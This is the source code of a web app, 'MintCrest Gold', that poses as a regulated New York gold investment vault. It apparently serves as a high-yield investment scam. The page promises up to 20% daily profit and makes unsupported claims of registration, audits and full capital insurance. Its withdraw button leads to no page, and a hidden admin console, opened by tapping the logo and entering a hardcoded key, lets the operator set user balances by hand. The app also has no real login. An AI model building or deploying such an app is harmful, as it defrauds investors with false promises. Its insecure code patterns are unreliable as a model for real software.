<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | New York Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; -webkit-user-select: text !important; user-select: text !important; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .badge-verified { background: rgba(59, 130, 246, 0.1); color: #3b82f6; padding: 2px 8px; border-radius: 99px; font-size: 8px; font-weight: 800; border: 1px solid rgba(59,130,246,0.3); }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-2 uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-[7px] text-gray-500 uppercase tracking-[0.4em] mb-12 font-bold italic">Global Gold Reserve • New York, USA</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Full Legal Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 uppercase">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-lg">Authenticate Session</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6 px-2">
                <div>
                    <p class="text-[7px] font-black text-gray-500 uppercase tracking-widest">Authorized Portfolio</p>
                    <div class="flex items-center gap-2">
                        <h3 id="display-username" class="text-lg font-black italic text-blue-400 uppercase tracking-tighter">Guest</h3>
                        <span class="badge-verified italic">VERIFIED</span>
                    </div>
                </div>
                <div class="text-right">
                    <p class="text-[7px] font-black text-gray-500 uppercase">Location</p>
                    <p class="text-[8px] font-bold text-white uppercase italic">NYC, USA 🇺🇸</p>
                </div>
            </div>

            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl relative overflow-hidden">
                <div class="absolute top-0 right-0 p-4 opacity-10 text-4xl font-black italic">USA</div>
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Total Asset Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                
                <div id="timer-box" class="mt-4 flex items-center gap-2">
                    <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
                    <div id="countdown-display" class="text-[10px] font-extrabold text-yellow-500 uppercase italic">System Idle</div>
                </div>

                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/10">No Active Fleet</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border border-white/5">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 border border-white/5">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-lg tracking-widest">Active Trading Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-4 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 tracking-widest">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[10px] uppercase mb-4">🎁 VIP PROMO REDEMPTION</h3>
                <input type="text" id="promo-input" placeholder="ENTER PROMO CODE" class="w-full bg-white/5 p-4 rounded-2xl text-center font-bold mb-4 border border-yellow-500/30 outline-none uppercase">
                <button onclick="claimPromo()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase">Claim Bonus</button>
            </div>

            <div class="glass p-8 rounded-[3rem] space-y-4">
                <h3 class="text-blue-500 font-black text-[10px] uppercase italic text-center tracking-widest">📜 USA CORPORATE BYLAWS</h3>
                <div class="text-[9px] text-gray-400 space-y-4 font-bold uppercase italic">
                    <p><span class="text-white">1. REGULATION:</span> MintCrest Gold is registered as a Class-A Asset Management firm in New York, USA. All gold reserves are audited quarterly.</p>
                    <p><span class="text-white">2. SECURITY:</span> We utilize AES-256 military-grade encryption to protect all transactions and user data from unauthorized access.</p>
                    <p><span class="text-white">3. INSURANCE:</span> Every investment is backed by the Global Liquidity Fund (GLF), ensuring 100% capital protection for our clients.</p>
                    <p><span class="text-white">4. WITHDRAWALS:</span> Withdrawals are processed daily between 10:00 AM and 06:00 PM EST. Verification may take up to 12 hours.</p>
                </div>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase italic tracking-widest">Terminate Global Session</button>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        <div id="adm-requests" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase mt-1">Fleets</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase mt-1">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // Plan Details: Days aur Profit ke saath
        const plans = [
            { n: "Bronze Fleet", p: 2000, r: 4, d: 30 },
            { n: "Silver Fleet", p: 5000, r: 4.8, d: 30 },
            { n: "Gold Fleet", p: 15000, r: 6, d: 30 },
            { n: "Diamond Fleet", p: 50000, r: 10, d: 30 },
            { n: "Royal Crown", p: 200000, r: 20, d: 30 },
            { n: "USA FLASH 24H", p: 1000, r: 15, d: 1, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000);
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name);
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-username').innerText = name;
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center mb-2 text-[9px] font-black uppercase italic border-l-4 border-blue-500"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${d.amount || 0}<br><span class="text-blue-400">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { 
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] border border-white/5 active:scale-95 transition-all">
                    <div class="flex justify-between items-center mb-4">
                        <h4 class="font-black text-[11px] uppercase ${p.s ? 'text-blue-400' : ''}">${p.n}</h4>
                        <span class="text-[10px] font-black">₨ ${p.p.toLocaleString()}</span>
                    </div>
                    <div class="flex justify-between items-center opacity-70">
                        <span class="text-[8px] font-bold uppercase">Daily Profit: ${p.r}%</span>
                        <span class="text-[8px] font-bold uppercase">Duration: ${p.d} Days</span>
                    </div>
                </div>`;
            });
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) return alert("Insufficient Balance in Vault!");
            if(confirm("Confirm Investment in " + tName + "?")) {
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() });
                alert("Investment Authorized Successfully!");
            }
        }

        async function claimPromo() {
            const code = document.getElementById('promo-input').value.trim().toUpperCase(); if(!code) return;
            await db.collection("requests").add({ user: user.name, type: "Promo Bonus", promo: code, status: "pending", time: Date.now(), amount: 0 });
            alert("Verification Sent to NYC Office!");
            document.getElementById('promo-input').value = '';
        }

        function updateCountdown() {
            if (user && user.activeTier > 0) {
                const d = (user.lastReqTime + 86400000) - Date.now();
                if(d > 0) {
                    const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000);
                    document.getElementById('countdown-display').innerText = `Next Yield: ${h}h ${m}m ${s}s`;
                } else { document.getElementById('countdown-display').innerText = "Yield Ready for Processing"; }
            } else { document.getElementById('countdown-display').innerText = "Global Node Idle"; }
        }

        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Access Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    list.innerHTML += `<div class="glass p-5 rounded-[2rem] border-l-4 border-yellow-500 mb-2">
                        <div class="flex justify-between text-[10px] font-black uppercase mb-3"><span>User: ${d.user}</span><span>Code: ${d.promo || 'N/A'}</span></div>
                        <div class="flex gap-2">
                            <input type="number" id="amt-${doc.id}" placeholder="Set Bonus Amount" class="flex-1 bg-white/5 p-3 rounded-xl text-xs outline-none border border-white/10">
                            <button onclick="approvePromo('${doc.id}', '${d.user}')" class="bg-green-600 px-6 rounded-xl font-black text-[9px] uppercase">Verify</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function approvePromo(reqId, userName) {
            const amt = parseInt(document.getElementById('amt-' + reqId).value); if(isNaN(amt)) return;
            const uRef = db.collection("users").doc(userName); const uDoc = await uRef.get();
            await uRef.update({ balance: (uDoc.data().balance || 0) + amt });
            await db.collection("requests").doc(reqId).update({ status: 'approved', amount: amt });
            alert("Success!");
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('n-'+p)?.classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
    </script>
</body>
</html>
